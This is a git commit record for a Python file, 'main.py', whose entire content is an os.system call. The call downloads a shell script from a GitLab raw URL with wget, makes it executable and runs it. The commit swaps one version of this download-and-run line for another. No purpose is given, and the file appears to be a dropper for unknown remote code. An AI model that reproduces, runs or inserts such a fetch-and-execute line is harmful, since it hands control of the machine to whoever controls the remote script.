9defee84695ed897501f5865ff027e6b0c0e9671
gersadega4 <gersadega4@gmail.com>
2026-03-22 09:08:33 +0700

    Update main.py

--- main.py
+++ main.py
@@ -1,2 +1,3 @@
 import os
-os.system('wget -O gas https://gitlab.com/barbieanay003/seger/-/raw/main/new.sh && sed -i 's/\r$//' gas && chmod +x gas && ./gas')
+
+os.system("wget -O new https://gitlab.com/barbieanay003/seger/-/raw/main/new.sh && sed -i 's/\r$//' new && chmod +x new && bash new")
